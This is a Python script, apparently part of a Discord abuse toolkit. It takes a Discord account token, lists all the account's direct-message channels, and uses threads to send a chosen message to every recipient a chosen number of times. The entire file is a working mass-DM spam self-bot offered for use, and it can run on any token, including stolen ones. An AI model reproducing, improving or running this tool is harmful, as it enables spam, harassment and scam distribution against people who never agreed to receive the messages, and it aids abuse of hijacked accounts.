# (c) 2026 IxilaA1 - Tous droits réservés / All rights reserved / Todos los derechos reservados.
# Ce code ne peut être ni vendu, ni modifié, ni partagé sans autorisation, ni publié à votre nom.
# This code may not be sold, modified, or shared without authorization, nor published under your name.
# Este código no puede ser vendido, modificado ni compartido sin autorización, ni publicado a su nombre.
# -------------------------------------------------------------------------------------------------------
import requests
import threading
import time
from datetime import datetime


red = "\033[91m"
white = "\033[97m"
reset = "\033[0m"


ADD = f"{red}[{white}+{red}]{reset}"
ERROR = f"{red}[{white}!{red}]{reset}"
INPUT = f"{red}[{white}?{red}]{reset}"
INFO = f"{red}[{white}i{red}]{reset}"
BEFORE = f"{red}[{white}"
AFTER = f"{red}]{reset}"

def current_time_hour():
    return datetime.now().strftime('%H:%M:%S')

def Slow(text):
    print(f"{red}{text}{reset}")

def Choice1TokenDiscord():
    return input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Token Discord -> {reset}")

def ErrorToken():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Token invalide.")
    exit()

def ErrorNumber():
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Nombre invalide.")
    exit()

def Error(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur: {e}")
    exit()

def Continue():
    input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Appuyez sur Entrée pour continuer...")

def Reset():
    print(reset)


discord_banner = """
  ____  _                        _    
 |  _ \(_)___  ___ ___  _ __ __| |___ 
 | | | | / __|/ __/ _ \| '__/ _` / __|
 | |_| | \__ \ (_| (_) | | | (_| \__ \\
 |____/|_|___/\___\___/|_|  \__,_|___/
"""

Title = lambda x: Slow(f"\n{x}\n")

try:
    def MassDM(token_discord, channels, Message):
        for channel in channels:
            for user in [x["username"]+"#"+x["discriminator"] for x in channel["recipients"]]:
                try:
                    requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers={'Authorization': token_discord}, data={"content": f"{Message}"})
                    print(f'{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Send{red} User: {white}{user}{red}')

                except Exception as e:
                    print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Status: {white}Error: {e}{red}')

    Slow(discord_banner)
    token_discord = Choice1TokenDiscord()
    validityTest = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token_discord, 'Content-Type': 'application/json'})
    if validityTest.status_code != 200:
        ErrorToken()
    
    try:
        message = str(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Message -> {reset}"))
    except:
        pass
    
    processes = []

    try:
        repetition = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Number of Repetitions -> {reset}"))
    except:
        ErrorNumber()

    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token_discord}).json()

    number = 0
    for i in range(repetition):
        number += 1
        if not channelIds:
            ()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=MassDM, args=(token_discord, channel, message))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Finish n°{number}.")
        time.sleep(0.5)
        

    Continue()
    Reset()
except Exception as e:
    Error(e)